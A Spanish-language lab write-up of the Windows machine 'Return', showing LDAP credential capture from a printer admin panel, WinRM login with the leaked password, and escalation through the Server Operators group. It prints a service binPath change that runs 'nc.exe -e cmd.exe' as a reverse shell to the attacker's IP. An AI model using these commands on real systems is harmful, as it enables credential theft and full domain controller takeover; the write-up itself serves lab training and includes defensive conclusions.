---
title: "Return (Easy)"
date: 2026-11-07
author: "Isma"
slug: "return"
tags: ["Windows", "AD", "LDAP", "Credential Leak", "Server Operators", "Service Abuse"]
categories: ["Machine"]
draft: false
source: "obsidian"
---

## Resumen

Return es una máquina Windows de dificultad fácil centrada en dos malas prácticas muy habituales en entornos corporativos. El acceso inicial se consigue abusando de un panel web de administración de impresoras que guarda las credenciales LDAP de una cuenta de servicio: basta con cambiar la dirección del servidor LDAP por la nuestra para que la impresora nos envíe la contraseña en texto claro. La escalada aprovecha que esa cuenta de servicio pertenece al grupo **Server Operators**, lo que permite reconfigurar un servicio que corre como `SYSTEM` y ejecutar una reverse shell con máximos privilegios.

## Reconocimiento

Empiezo con un escaneo de puertos:

```powershell
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-08 13:33:32Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Los puertos 53, 88, 389 y 3268 delatan que estamos ante un **controlador de dominio** (`return.local`). Además hay un IIS en el puerto 80 con el título *HTB Printer Admin Panel* y WinRM (5985) abierto, que me servirá más adelante si consigo credenciales.

### SMB

La sesión anónima por SMB está deshabilitada, así que sin credenciales no puedo enumerar recursos compartidos.

![return](/images/obsidian/return/image-1226.png)

![return](/images/obsidian/return/image-1227.png)

### Descartando PrintNightmare

Al tratarse de un servidor de impresión, lo primero que compruebo es si el servicio **Print Spooler** está expuesto por RPC (interfaces MS-RPRN / MS-PAR), ya que eso abriría la puerta a **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**.

![return](/images/obsidian/return/image-1228.png)

El spooler responde, pero esta vulnerabilidad requiere un usuario autenticado del dominio. De momento no tengo ninguno, así que la aparco y sigo con la web.

## Acceso Inicial (Foothold)

### Robo de credenciales LDAP desde el panel de la impresora

En la sección **Settings** del panel aparece la configuración LDAP de la impresora: servidor `printer.return.local`, puerto `389`, usuario `svc-printer` y una contraseña enmascarada.

![return](/images/obsidian/return/image-1229.png)

La contraseña no se puede leer desde el navegador, pero el formulario permite cambiar el **Server Address**. Si pongo mi IP, la impresora intentará autenticarse contra *mi* "servidor LDAP" usando un **bind simple**, que envía las credenciales en texto claro. Me pongo a la escucha en el puerto 389:

```bash
nc -lvnp 389
```

Cambio el *Server Address* por mi IP (`10.10.15.44`), pulso **Update** y recibo la conexión con la contraseña:

![return](/images/obsidian/return/image-1230.png)

```
svc-printer : 1edFg43012!!
```

Con estas credenciales vuelvo a probar PrintNightmare, pero el exploit se queda colgado con un `NetBIOSTimeout` y no llega a cargar la DLL, así que descarto esa vía y entro directamente por WinRM:

```bash
evil-winrm -i 10.129.66.249 -u svc-printer -p '1edFg43012!!'
```

![return](/images/obsidian/return/image-1231.png)

Ya tengo shell como `svc-printer` y puedo leer la **User Flag**.

## Escalada de Privilegios

### Enumeración de grupos

Reviso a qué grupos pertenece la cuenta:

```powershell
net user svc-printer /domain
```

```
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```

Pertenece a **Server Operators**, un grupo integrado de Windows muy privilegiado: sus miembros pueden iniciar sesión en los controladores de dominio, hacer copias de seguridad y, lo más importante aquí, **modificar, parar y arrancar servicios**.

- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

### Abuso de un servicio (VMTools)

Muchos servicios de Windows se ejecutan como **LocalSystem**. Si puedo cambiar la ruta del ejecutable de uno de ellos (`binPath`), al reiniciarlo Windows ejecutará lo que yo quiera con privilegios de `SYSTEM`.

Con el comando `services` de Evil-WinRM listo los servicios y veo cuáles puedo modificar. Elijo **VMTools**:

![return](/images/obsidian/return/image-1232.png)

Subo `nc.exe` a la máquina:

```powershell
upload /usr/share/windows-resources/binaries/nc.exe
```

![return](/images/obsidian/return/image-1233.png)

Cambio el `binPath` del servicio para que lance una reverse shell hacia mi máquina y lo reinicio:

```powershell
sc.exe config VMTools binPath="C:\Users\svc-printer\nc.exe -e cmd.exe 10.10.15.44 4444"
sc.exe stop VMTools
sc.exe start VMTools
```

![return](/images/obsidian/return/image-1234.png)

Con un listener en el puerto 4444 recibo la conexión como `NT AUTHORITY\SYSTEM`:

![return](/images/obsidian/return/image-1235.png)

![return](/images/obsidian/return/image-1236.png)

Máquina comprometida y **Root Flag** capturada.

> **Nota**
> La shell obtenida abusando de un servicio es inestable: el gestor de servicios la mata a los ~30 segundos porque `nc.exe` no responde como un servicio real. Conviene usarla para lanzar una segunda shell o añadir un usuario administrador nada más entrar.

## Conclusiones

- Un panel de administración que guarda credenciales y permite cambiar el servidor de destino es, en la práctica, un "envíame la contraseña". Los dispositivos con LDAP deberían usar LDAPS y no permitir editar el servidor sin volver a introducir la contraseña.
- **Server Operators** debería tratarse como un grupo equivalente a Domain Admins: poder modificar servicios en un DC es tener `SYSTEM`.
